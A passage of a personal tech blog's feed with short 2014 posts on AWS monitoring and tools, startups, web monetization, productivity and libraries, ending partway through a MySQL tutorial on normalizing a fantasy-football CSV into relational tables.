<p>One of our alerts checks for faulty instances that are attached to a load balancer. We’re notified whenever one goes down with the goal of investigating the cause and getting it back up and running. While serious, it’s not critical since there’s a fair amount of redundancy and the user won’t notice any impact unless a large enough number of instances fail. Using the symptom-based monitoring approach we were able to tweak the alert to monitor the <a href="http://docs.aws.amazon.com/ElasticLoadBalancing/latest/DeveloperGuide/US_MonitoringLoadBalancerWithCW.html" target="_blank">latency of requests</a> made by the load balancer to the instance and trigger a warning if it gets too high for too long. This reduces the number of non-critical alerts while making critical alerts more in line with customer expectations.</p>

<p>The larger an application gets the more essential it is to have a firm overview of the system with a solid set of alerts. Too many and you end up either missing important ones or wasting too much team dealing with false positives. Too few and you discover problems too late. Alerts are typically, and rightly, ignored on smaller projects but when you have multiple applications distributed across dozens of instances it’s increasingly important, and simultaneously more difficult, to understand what’s happening. Something I’ve started doing to identify potential improvements is tracking every single alert and tracking it’s false-positive rate with the goal of finding alerts that aren’t meaningful and either get rid of them or replace them with something more actionable. Over time we’ll hopefully get the right balance.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS: Always shipping</title>
   <link href="http://dangoldin.com/2014/11/24/aws-always-shipping/"/>
   <updated>2014-11-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/24/aws-always-shipping</id>
   <content:encoded><![CDATA[
<div class="thumbnail">
  <img src="http://dangoldin.com/assets/static/images/aws-services-new.png" alt="AWS services" width="1027" height="694" layout="responsive"/>
</div>

<p>I never thought about this until <a href="https://twitter.com/szach">Shaun</a> brought it up but now I see it all the time: AWS ships code quicker than any other company that size. Some are simple feature improvements to existing products, such as an advanced instance search, additional configuration options for ELBs, and new instance types, but others are entirely new products, such as Lambda, EC2 Container Service, and the newly announced code management suite.</p>

<p>What’s even more impressive is that they provide infrastructure to thousands of other companies and the cost of failure is massive. A breaking feature will affect thousands of companies and cost a ton of money and hurt their reputation. Yet they keep on shipping and launching as if they were a newly launched startup.</p>

<p>I’d love to know the process Amazon has in place that drives these releases - both how they’re able to code at such scale as well as the test process they use to make sure no existing functionality breaks due to new features.</p>

<p>The half serious joke here is that Amazon is always shipping - physical items from Amazon.com and digital services from AWS.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Fab's fall from grace and the difficulty of startups</title>
   <link href="http://dangoldin.com/2014/11/22/fabs-fall-from-grace-and-the-difficulty-of-startups/"/>
   <updated>2014-11-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/22/fabs-fall-from-grace-and-the-difficulty-of-startups</id>
   <content:encoded><![CDATA[
<p>The recent news that PCH is set to acquire Fab reiterates how difficult startups are. So many startups strive to get an investment and believe that once they raise a round everything will get easier. That’s when things get difficult. Instead of focusing on achieving product market fit you start worrying about market share, competition, company culture, recruiting, process, which require a completely different skillset than what you started with. And to add to that you’re now accountable to a growing list of employees, shareholders, and customers. When I was working on my first startup I really thought that being able to get funding was the measure of success. Now I realize how naive that view was and how much more there actually is. Fab raised over $330M and wasn’t able to grow into a successful business despite undertaking massive pivots. There  are probably thousands of founders claiming that they’d be able to succeed with that kind of money without realizing how difficult it actually is.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Paying publishers without ads</title>
   <link href="http://dangoldin.com/2014/11/20/paying-publishers-without-ads/"/>
   <updated>2014-11-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/20/paying-publishers-without-ads</id>
   <content:encoded><![CDATA[
<p>Google recently launched a program, <a href="https://www.google.com/contributor/welcome/" target="_blank">Contributor</a>, that offers an ad-free monetization model to publishers. The idea is that a user pays Google up to $3 a month and in return Google will not show that user any display ads on a website that’s a participant in the program. The monthly payment will then be distributed across the participating sites - most likely based on how many times you’ve visited that site.</p>

<p>I like the idea - not because most ads are terrible but because it shows that both publishers and Google are willing to experiment with another approach. Ads, as much as we dislike them, are the primary way content producers make money since web users expect free content everywhere.</p>

<p>The biggest audience for Contributor will be those who currently run adblock but feel guilty about it. Most people want the content free on principle and refuse to pay but the people that are using adblock but do want to support the publisher may be willing to pay the $3 a month to feel noble - in fact they might keep on running adblock and treat this as a way to reward the sites they visit.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Backendless applications</title>
   <link href="http://dangoldin.com/2014/11/18/backendless-applications/"/>
   <updated>2014-11-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/18/backendless-applications</id>
   <content:encoded><![CDATA[
<p>I’ve been a fan of GitHub pages ever since I started using them to host my blog a couple of years ago and a thought that’s been constantly popping up is why there haven’t been any products or services that help small businesses host their sites on GitHub. GitHub’s <a href="https://help.github.com/articles/github-terms-of-service/" target="_blank">terms of service</a> forbid a third party from hosting pages on behalf of customers but it doesn’t seem as if there’s anything stopping someone from building a tool or documenting the set of steps to help someone create a simple site and have it hosted on GitHub. That way the business only has to pay a domain registration fee while still getting fast and robust hosting with a fairly solid CMS.</p>

<p>Going further this site can be made significantly more dynamic by integrating third party services via client side JavaScript. Use Facebook to handle authentication, Google Analytics to provide analytics, Disqus to provide comments, and Firebase to provide a data layer. There’s no backend to maintain and you get to use a set of free and powerful tools. This isn’t going to work in every use case but over time we’ll see more and more applications built using this approach.</p>

<p>The simplest code is the code that you don’t have to write and I think we’ll start seeing more and more of these third party services that provide specialized functionality via JavaScript snippets. Many of them will also be free when starting out since their marginal cost will be virtually zero for small projects and will encourage tons of people to create these pseudo static sites that provide dynamic functionality without a backend. I suspect that as these tools become more popular we’ll see them packaged together by other companies and services that will make web development accessible to a wider audience. One of these days I’ll see what kind of application I can build using free services and client side JavaScript.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Productivity optimization</title>
   <link href="http://dangoldin.com/2014/11/13/productivity-optimization/"/>
   <updated>2014-11-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/13/productivity-optimization</id>
   <content:encoded><![CDATA[
<p>A pretty trivial post but something I’ve been doing for a while now is keeping my dock as a vertical bar on the right of my screen. I started doing this years ago when I was working on Windows and it was too difficult to track every single program that was running. At that point I was in finance and would have a dozen Excel workbooks open and needed to be able to quickly switch between them. The only way I could do this with a bottom toolbar was by making it extremely thick which would take up too much space. Moving it to the side solved that problem and I stuck with it as I moved to Ubuntu and now OS X.</p>

<p>These days I have significantly fewer programs running at once and I’m much better at hopping between programs but it’s surprising what a good dock location can do for efficiency. Getting everything right only saves a fraction of a second but doing this countless times a day adds up. As important as tools are, the way they are access and used is just as important. The challenge is getting stuck with a suboptimal routine that you’re used to and not moving to a more optimal one since the short term cost is high. The greatest example of this is probably the <a href="http://en.wikipedia.org/wiki/Dvorak_Simplified_Keyboard" target="_blank">Dvorak keyboard layout</a> - in theory it’s significantly faster than QWERTY and yet virtually everyone is using the slower QWERTY approach. It’s just good enough.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Some simple AWS tools</title>
   <link href="http://dangoldin.com/2014/11/09/some-simple-aws-tools/"/>
   <updated>2014-11-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/09/some-simple-aws-tools</id>
   <content:encoded><![CDATA[
<p>Last night I took an old bash script I wrote that simplified connecting to an EC2 instance in an AWS account and implemented the same code in Python. The old code worked by listing a set of AWS instances and then prompting to pick a single one to connect to. The problem was that it wasn’t always easy to find the index of the desired instance and the code took a bit of time to run.</p>

<p>The new code leverages the Python AWS library to pull down the list of instances for a given region and then filters it down based on the name, IP address, or public DNS. If it turns out there’s a match then it will only return the public IP address which makes it easy to connect using ssh. For example, to list all servers containing the name “web server” you would run the following:</p>

<figure class="highlight"><pre><code class="language-sh" data-lang="sh">python list_hosts.py <span class="nt">--region</span><span class="o">=</span>us-east-1 <span class="nt">--filter</span><span class="o">=</span><span class="s2">"web server"</span></code></pre></figure>

<p>And if you know there will only be one you can connect to it directly by using ssh and running the script inside two backticks:</p>

<figure class="highlight"><pre><code class="language-sh" data-lang="sh">ssh <span class="sb">`</span>python list_hosts.py <span class="nt">--region</span><span class="o">=</span>us-east-1 <span class="nt">--filter</span><span class="o">=</span><span class="s2">"web server"</span><span class="sb">`</span></code></pre></figure>

<p>The code’s up on <a href="https://github.com/dangoldin/aws-tools" target="_blank">GitHub</a> but at the moment there’s just this single script. I’ll keep adding more as I run into various issues working with AWS.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Luxury for cheap</title>
   <link href="http://dangoldin.com/2014/11/05/luxury-for-cheap/"/>
   <updated>2014-11-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2014/11/05/luxury-for-cheap</id>
   <content:encoded><![CDATA[
<p>I recently read a FiveThirtyEight article on the <a href="http://fivethirtyeight.com/features/you-see-sneakers-these-guys-see-hundreds-of-millions-in-resale-profit/" target="_blank">sneaker resale market</a>. The concept is extremely foreign to me since I tend to not collect anything other than old notes and have a tendency of grossly mistreating my shoes and clothes. Nonetheless, I found it fascinating as it discusses the incentives of the various parties involved and comparing them against standard economic theory. One passage in particular was so insightful that I had to save it:</p>

<blockquote>
That differential allows people to buy something on the cheap but feel like they’re wearing a luxury item. <br /><br />
“So even if you paid $100, you’ve got $800 on your feet. It’s like having Gucci,” Taylor said</blockquote>

<p>Everyone loves getting a deal but I think this is slightly different since it’s not so much about getting the deal as it is about being able to afford luxury and show it off. Sure it’s vain and has a bit of conspicuous consumption but if it gives someone self confidence and makes them feel like a million bucks I can’t complain.</p>

<p>We should strive to provide this type of experience when building apps and services. It’s not just adding some cheap gamification tricks or rewarding early users as much as it is making people proud to use your product. gamification tricks or rewarding early users as much as it is making people proud to use your product.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tools as tools, not products</title>
   <link href="http://dangoldin.com/2014/11/01/tools-as-tools-not-products/"/>
   <updated>2014-11-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/11/01/tools-as-tools-not-products</id>
   <content:encoded><![CDATA[
<p>I keep on discovering new use cases for <a href="http://daringfireball.net/projects/markdown/syntax" target="_blank">Markdown</a> the more I use it. My first exposure was when I migrated my blog to GitHub pages from Wordpress and Tumblr. Since then I’ve discovered GitHub flavored markdown which supports syntax highlighting which has been amazingly useful when blogging on tech topics or putting together notes for a tech talk. Just recently I wanted to include some MySQL snippets in a Keynote presentation and discovered the <a href="http://remarkjs.com/#1" target="_blank">Remark.js</a> library which lets you generate in-browser slideshows in Markdown with syntax highlighting.</p>

<p>There’s this desire to turn tools into products and it’s refreshing to see tools stay tools. They are able to stay much more flexible and evolve organically based on the needs of users rather than a preset direction. Markdown is a perfect example of this - it started simple but has evolved to have multiple variations and is used as the base for many other projects. At this point it has become such a standard that it can’t be co-opted by any single product or company.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Libraries</title>
   <link href="http://dangoldin.com/2014/10/28/libraries/"/>
   <updated>2014-10-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/28/libraries</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/cornell-ad-white.jpg" alt="A.D. White Reading Room @ Cornell University" width="700" height="466"/>
<p class="caption"><a href="http://www.flickr.com/photos/eflon/2874341070/in/set-72157607982619613">A.D White Library @ Cornell University by eflon</a></p>

<p>For the first time in almost a decade I checked out a book from a library. I don’t know why I ever stopped - the experience is extremely simple and you’re able to read a book for free. I had a book on my Amazon wishlist for a couple of weeks that I held off on buying but was able to read it over the past week after a quick visit to the library.</p>

<p>As a kid I used to go the library all the time and would go through multiple books a week and this brought back all those memories. I feel guilty for abandoning libraries in favor of Amazon and my iPad and think many people are missing out by consuming everything digitally. It’s not just the physical element but also the nostalgia and the knowledge that there were dozens of people who have read the exact same book you’re reading now. Reading a library book makes you feel that you’re a step in the book’s journey as it grows from home to home and person to person. That’s completely lost in a digital world and it will only get worse as libraries change to stay relevant. Until then I look forward to going back and checking out another book.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Lessons learned teaching a MySQL class</title>
   <link href="http://dangoldin.com/2014/10/27/lessons-learned-teaching-a-mysql-class/"/>
   <updated>2014-10-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/27/lessons-learned-teaching-a-mysql-class</id>
   <content:encoded><![CDATA[
<p>Last Thursday was the last lesson of the four part Introduction to MySQL class I’ve been teaching at <a href="http://www.c4q.nyc/" target="_blank">Coalition for Queens</a> and I wanted to summarize my thoughts while they’re still fresh.</p>

<p>The diversity of the class was amazing and shows how useful affordable technology programs are. You get a mix of people from different backgrounds and different ages that all want to improve themselves and can all contribute in their own ways. Everyone has a unique experience and introducing technology into it may open up new opportunities.</p>

<p>It’s tough to get a curriculum that works for everyone but it’s important to try. Some people grasp concepts quicker than others. Some want to see more hands-on exercises. Some want homework assignments. Some want to be able to split up into groups and work with others on more complicated assignments. The dataset itself needs to be relevant and realistic or people will lose interest. I put the <a href="https://dangoldin.github.io/mysql-class/" target="_blank">curriculum up on GitHub</a> for suggestions but didn’t get any - hopefully others will use it in their classes.</p>

<p>Tools matter. For the first two sessions I used Keynote to generate the presentation and then exported it to a PDF. This approach lacked syntax highlighting which I wanted given the technical nature of the course. I switched to the wonderful <a href="http://remarkjs.com/#1" target="_blank">Remark.js</a> which allowed me to create slideshows using GitHub flavored markdown. This allowed me to integrate exercises into the lecture while incorporating syntax-highlighted examples. One issue was that it wasn’t as straightforward to export it as a PDF and I had to print it to a PDF file via Chrome.</p>

<p>Volunteer teaching is a great way to “teach to fish” rather than just giving a fish while helping develop public speaking skills and meeting a ton of awesome people. If you’re in New York City, work in technology, and believe technical skills are increasingly important you should take a look and try teaching a class at Coalition for Queens.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Spam blog comments</title>
   <link href="http://dangoldin.com/2014/10/26/spam-blog-comments/"/>
   <updated>2014-10-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/26/spam-blog-comments</id>
   <content:encoded><![CDATA[
<p>Ever since I’ve started blogging I’ve been getting around one spam blog comment a week. <a href="https://disqus.com/" target="_blank">Disqus</a> does a nearly perfect job of flagging them so I don’t understand the motivation behind it. They’re obviously spam and my readers are suave enough to never click on any of the links. There’s also little, possibly none, SEO value since they’re all loaded asynchronously and every link has a rel=”nofollow” property. And if the goal is to spark a discussiong and raise awareness they’re so poorly worded that no reader will take them seriously. The only thing I can think of is that these companies pay a third party service to grace tangentially related blogs with content on their behalf and these third party services go the cheapest possible route in both effort and quality.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My first open source contribution</title>
   <link href="http://dangoldin.com/2014/10/19/my-first-open-source-contribution/"/>
   <updated>2014-10-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/19/my-first-open-source-contribution</id>
   <content:encoded><![CDATA[
<p>Despite being a huge proponent of open source I’ve never made a contribution to a <a href="https://github.com/whymarrh/jeopardy-parser" target="_blank">third party project</a> until this weekend. The project was a simple scraper that downloads each Jeopardy game from <a href="http://j-archive.com/" target="_blank">j-archive.com</a>, parses the data, and loads into a SQLite database. The project had one issue open that was to make the download code threaded in order to reduce the time of downloading nearly 4700 games from over 7 hours to less than 30 minutes. I gave this a stab on Saturday and submitted a pull request that was merged in by the author on Sunday.</p>

<p>The process was surprisingly simple and it felt good making an improvement to an already useful project. An idea I’ve been toying with is making a contribution to every open source project I use. Some would be simple and may not even be code while others might be significant improvements. The idea is to continue continue the cycle of improvement to projects that have made me more productive. I can only imagine what would happen if everyone who uses open source adopted this approach.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Link bait titles are a race to zero</title>
   <link href="http://dangoldin.com/2014/10/18/link-bait-titles-are-a-race-to-zero/"/>
   <updated>2014-10-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/18/link-bait-titles-are-a-race-to-zero</id>
   <content:encoded><![CDATA[
<p>A couple of days ago I saw a mic.com article with the title “A European country is now offering free college education to Americans” but the only way to find out which country this was (Germany) was by clicking through to the actual page.</p>

<img src="http://dangoldin.com/assets/static/images/mic-link-bait.png" alt="Mic link bait title" width="1458" height="868" layout="responsive"/>

<p>I understand that content sites make the bulk of their revenue through advertising but resorting to a link-bait approach seems like a terrible idea. It’s a shortsighted attempt that increases page views at the cost of insulting your audience and cheapening your effort that will not work as a sustainable strategy. Relying on headlines to generate traffic without any meaningful content is a great way to get to become a commodity. I hope that there are enough people out there that care about the content they’re producing and have a passionate audience that can be monetized based on quality of engagement rather than on quantity of page views. Otherwise we’ll all end up in a race to zero.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AWS Glacier</title>
   <link href="http://dangoldin.com/2014/10/12/aws-glacier/"/>
   <updated>2014-10-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/12/aws-glacier</id>
   <content:encoded><![CDATA[
<p>I’ve been trying to reduce the amount of stuff I have and a big part of it is old electronics. I’ve been selling off old headphones and random cables but the one thing that’s been more difficult to get rid of is older hard drives. I know that most of the stuff on them is junk that I’ll never see again but it’s still tough to just throw it away. They’re reminders of previous jobs and old projects that are a part of my identity that are tough to permanently delete with a click. Many of them are unique in the world and only exist on an old hard drive. I realize it’s foolish to keep them around but it’s tough to let go.</p>

<p>I thought about moving the stuff over to Dropbox but upgrading to a paid plan to store a bunch of files I’d never touch again seemed wasteful. I wanted something that was a one time upload, was cheap, and gave me peace of mind. I recently read about <a href="https://aws.amazon.com/glacier/" target="_blank">Amazon’s Glacier</a> product and it fit the bill perfectly. It’s a penny a month for each GB stored but with additional fees for retrieving old files. Looking at the amount of files I want to store this would cost me less than 20 cents a month and allows me to get rid of a ton of old drives. I spent a couple of evenings this past week tarring up these old files and transferring them to Glacier using the <a href="http://simpleglacieruploader.brianmcmichael.com/" target="_blank">Simple Amazon Glacier Uploader</a> app.</p>

<p>Glacier is a great fit for data that’s difficult to throw away but unlikely to be accessed and is significantly cheaper than Dropbox. I’m in the process of going through more and more of my data and seeing which of it would be a good fit for Glacier.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Clearing my head</title>
   <link href="http://dangoldin.com/2014/10/08/clearing-my-head/"/>
   <updated>2014-10-08T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/08/clearing-my-head</id>
   <content:encoded><![CDATA[
<p>This weekend I felt discouraged after getting cold but dragged myself outside to go for a walk and clear my head. I ended up getting a cup of coffee and just sat on a bench for 30 minutes and letting random thoughts go in and out of my head. It turned into a form of personal meditation where some ideas crystallized and stuck around while others quickly disappeared. It felt great (so great that I ended up going back to my apartment and doing a bunch of chores I’ve been putting of!), especially considering that I had to drag myself away from the couch to even go for the walk and would have much preferred to just sit on the couch and watch football.</p>

<p>While sitting on the bench I made three resolutions that are making me feel more inspired and productive. They’re all simple and only require commitment but I’m definitely benefiting from them.</p>

<ul>
<li><strong>Stop procrastinating</strong>. We all have a ton of things to do and I got into the habit of delaying simple ones like dropping off clothes for dry cleaning or selling some old electronics on eBay. Lately I’ve started going through my list of todos and it feels great. Each small achievement is something that I can cross off and encourages me to move on to the next one. For most of these priority doesn’t even matter since the important stuff happens anyway; it’s the small items that tend to get stuck in a state of never done.</li>
<li><strong>Focus on one thing at a time</strong>. This is the hardest one for me but I realized that I tend to get distracted too easily. Whether it’s checking my email or browsing Hacker News it’s a huge inefficiency. I’ve also found myself trying to do work passively while watching a football game and it’s noticeable how little I get done that there’s no point in even attempting to work. It’s not possible to achieve <a href="https://en.wikipedia.org/wiki/Mihaly_Csikszentmihalyi#Flow" target="_blank">flow</a> without being able to concentrate on one thing and quality suffers. It’s not even a good use of time since you’ll just end up taking a longer time to do two things poorly. It’s better off to get the stuff that requires your attention out of the way and then spend the rest of the time relaxing.</li>
<li><strong>Take distraction free breaks</strong>. Given how useful going for a aimless walk was I decided to make this a habit and try to go for at least three a week. So far I tried going before work but it wasn’t the same. Either the subconscious knowledge that I needed to track my time in order to get to the office or being in a highly trafficked city intersection made it harder to get lost in my thoughts. In any case I might end up making this a once-a-week activity and do it on the weekends in a quieter place where I can be distraction free.</li>
</ul>

<p>I’d love to know of other resolutions that people have embraced to make them feel happier, inspired, and productive so if you have any ideas definitely let me know.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>XKCD movie quotes by Android</title>
   <link href="http://dangoldin.com/2014/10/04/xkcd-movie-quotes-by-android/"/>
   <updated>2014-10-04T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/04/xkcd-movie-quotes-by-android</id>
   <content:encoded><![CDATA[
<p>Earlier this week XKCD featured a <a href="https://xkcd.com/1427/" target="_blank">comic</a> where oft-quoted movie quotes are autocompleted by iOS keyboard predictions. I decided to do replicate the exercise using Android and Swype. Some are similar while others are completely different. I suspect a big part of the difference is that Swype uses my history when offering the suggestions and since I’ve been travelling recently many of them tend to be airport related.</p>

<blockquote>
  <b>Say hello to my little</b> brother and sister and the other hand.
</blockquote>
<blockquote>
  <b>Toto, I've a feeling we're not</b> going to be a good time.
</blockquote>
<blockquote>
  <b>Bond, James Bond</b> with the Eagles to the airport.
</blockquote>
<blockquote>
  <b>I'm a leaf on the wind. Watch</b>the video game console and I will get there early.
</blockquote>
<blockquote>
  <b>Goonies never say</b>never been to the airport.
</blockquote>
<blockquote>
  <b>You have my sword. And my bow. And my</b>wife.
</blockquote>
<blockquote>
  <b>Hello, my name is Inigo Montoya. You</b>can send you a call to discuss the details.
</blockquote>
<blockquote>
  <b>Revenge is a dish best served</b>from the other side of the terminals.
</blockquote>
<blockquote>
  <b>They may take our lives, but they'll never take our</b>word for it.
</blockquote>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Normalizing a CSV file using MySQL</title>
   <link href="http://dangoldin.com/2014/10/01/normalizing-a-csv-file-using-mysql/"/>
   <updated>2014-10-01T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2014/10/01/normalizing-a-csv-file-using-mysql</id>
   <content:encoded><![CDATA[
<p>As part of my preparation for the Intro to MySQL class I decided to put together a dataset we’d be able to explore over the course of the class. While trying to think of an interesting dataset to use I remembered I had a script that scraped Yahoo’s fantasy football projections for the 2014 seasons that I used to prepare for my draft. The only issue was that the script generated a CSV file so I had to go through a series of steps to turn it into a clean, relational database. I thought it would be useful to share the commands below and provide some context for those interested in learning more about MySQL and the data import/cleanup process.</p>

<p>The first step is to create the table that we’ll be loading the CSV file into</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">create</span> <span class="k">database</span> <span class="n">stats</span><span class="p">;</span>
<span class="n">use</span> <span class="k">database</span> <span class="n">stats</span><span class="p">;</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">orig_stats</span> <span class="p">(</span>
  <span class="n">week</span> <span class="nb">int</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
  <span class="k">position</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">),</span>
  <span class="n">opp</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span>
  <span class="n">passing_yds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">passing_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">passing_int</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">rushing_att</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">rushing_yds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">rushing_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_tgt</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_rec</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_yds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">return_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">twopt</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">fumbles</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">points</span> <span class="nb">float</span>
<span class="p">);</span></code></pre></figure>

<p>Now we load the CSV file into the table making sure to specify the options properly. In my case this took a few attempts to deal with the line endings.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">LOAD</span> <span class="k">DATA</span> <span class="n">INFILE</span> <span class="s1">'/tmp/stats-2014.csv'</span>
<span class="k">INTO</span> <span class="k">TABLE</span> <span class="n">orig_stats</span>
<span class="n">FIELDS</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="s1">','</span>
<span class="n">LINES</span> <span class="n">TERMINATED</span> <span class="k">BY</span> <span class="s1">'</span><span class="se">\r\n</span><span class="s1">'</span>
<span class="k">IGNORE</span> <span class="mi">1</span> <span class="n">LINES</span> <span class="p">;</span></code></pre></figure>

<p>Next step is to create the tables we want to end up with. In my case I wanted to normalize the data which required designed a new set of tables. A big assumption made here was that a player will not get traded from one team to another. This is definitely not correct in the real world but it is good enough for this exercise. If we wanted to allow for trades we would have a separate table that would map a player to a team by week.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">create</span> <span class="k">table</span> <span class="n">teams</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="nb">unsigned</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
  <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">),</span>
  <span class="k">UNIQUE</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="p">);</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">positions</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="nb">unsigned</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span>
  <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">),</span>
  <span class="k">UNIQUE</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="p">);</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">players</span> <span class="p">(</span>
  <span class="n">id</span> <span class="nb">int</span> <span class="nb">unsigned</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span>
  <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
  <span class="n">position_id</span> <span class="nb">int</span><span class="p">,</span>
  <span class="n">team_id</span> <span class="nb">int</span><span class="p">,</span>
  <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">);</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">schedule</span> <span class="p">(</span>
  <span class="n">week</span> <span class="nb">int</span><span class="p">,</span>
  <span class="n">home_id</span> <span class="nb">int</span><span class="p">,</span>
  <span class="n">away_id</span> <span class="nb">int</span><span class="p">,</span>
  <span class="k">UNIQUE</span> <span class="p">(</span><span class="n">week</span><span class="p">,</span> <span class="n">home_id</span><span class="p">,</span> <span class="n">away_id</span><span class="p">)</span>
<span class="p">);</span>

<span class="k">create</span> <span class="k">table</span> <span class="n">stats</span> <span class="p">(</span>
  <span class="n">week</span> <span class="nb">int</span><span class="p">,</span>
  <span class="n">player_id</span> <span class="nb">int</span><span class="p">,</span>
  <span class="n">passing_yds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">passing_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">passing_int</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">rushing_att</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">rushing_yds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">rushing_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_tgt</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_rec</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_yds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">receiving_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">return_tds</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">twopt</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">fumbles</span> <span class="nb">float</span><span class="p">,</span>
  <span class="n">points</span> <span class="nb">float</span>
<span class="p">);</span></code></pre></figure>

<p>Now it’s on to the hard part. We want to take the data in the original stats table and convert into a properly normalized data set. The strategy here is to start with the simple tables and work our way up to the more complicated ones leveraging the normalized data we created at each step. The first two tables are teams and positions and we can derive them from the “position” field in the original stats table by splitting the position field into two and realizing that the left side is the team and the right side is the position of given the player.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">insert</span> <span class="k">into</span> <span class="n">teams</span>
  <span class="p">(</span><span class="n">name</span><span class="p">)</span>
  <span class="k">select</span> <span class="k">distinct</span><span class="p">(</span><span class="n">substring_index</span><span class="p">(</span><span class="k">position</span><span class="p">,</span> <span class="s1">' - '</span><span class="p">,</span> <span class="mi">1</span><span class="p">))</span>
  <span class="k">from</span> <span class="n">orig_stats</span> <span class="k">order</span> <span class="k">by</span> <span class="k">position</span><span class="p">;</span>

<span class="k">insert</span> <span class="k">into</span> <span class="n">positions</span>
  <span class="p">(</span><span class="n">name</span><span class="p">)</span>
  <span class="k">select</span> <span class="k">distinct</span><span class="p">(</span><span class="n">substring_index</span><span class="p">(</span><span class="k">position</span><span class="p">,</span> <span class="s1">' - '</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="k">as</span> <span class="n">pos</span>
